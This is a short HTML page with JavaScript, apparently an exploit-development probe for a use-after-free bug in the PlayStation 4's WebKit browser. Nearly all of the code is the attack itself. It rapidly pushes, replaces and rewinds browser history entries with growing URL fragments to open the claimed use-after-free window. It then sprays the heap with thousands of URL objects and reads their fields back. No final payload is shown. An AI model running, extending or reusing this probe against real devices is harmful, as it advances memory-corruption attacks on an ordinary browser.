<!DOCTYPE html>
<html>
<head>
<meta charset="UTF-8">
<title>PS4 WebKit – URL Object UAF Probe</title>
<style>
body { font-family: monospace; background:#000; color:#0f0; }
button { font-size:16px; padding:10px; }
#log { white-space: pre-wrap; }
</style>
</head>

<body>
<h2>PS4 WebKit – HistoryItem / URL Reuse</h2>
<button onclick="run()">RUN URL REUSE</button>
<div id="log"></div>

<script>
const logEl = document.getElementById("log");
function log(m){ logEl.textContent += m + "\n"; }
function sleep(ms){ return new Promise(r=>setTimeout(r,ms)); }

async function run(){
    logEl.textContent = "";
    log("=== START URL UAF PROBE ===");

    let size = 977;
    const STEP = 14461;

    // ---------------------------------
    // Phase 1 – Trigger exact UAF window
    // ---------------------------------
    for(let i=0;i<48;i++){
        let frag = "A".repeat(size);
        history.pushState({}, "", "#"+frag);
        history.replaceState({}, "", "#"+frag.slice(0, frag.length >> 1));

        if(i % 6 === 0)
            setTimeout(()=>history.back(),0);

        size += STEP;
        await sleep(5);
    }

    log(">>> UAF WINDOW <<<");
    await sleep(120);

    // ---------------------------------
    // Phase 2 – URL Object Heap Pressure
    // ---------------------------------
    log("[REUSE] Allocating URL objects");
    let urls = [];
    for(let i=0;i<3000;i++){
        urls.push(new URL(
            "https://example.com/" +
            i +
            "/" +
            Math.random().toString(36).repeat(4)
        ));
    }

    log("[REUSE] Touching URL fields");
    let acc = 0;
    for(let i=0;i<urls.length;i+=7){
        acc ^= urls[i].href.length;
        acc ^= urls[i].pathname.length;
    }

    log("ACC="+acc);

    // ---------------------------------
    // Phase 3 – History interaction
    // ---------------------------------
    log("[POST] Accessing history");
    try {
        let l = history.length;
        log("history.length="+l);
    } catch(e){
        log("history exception");
    }

    log("=== END PROBE ===");
}
</script>
</body>
</html>
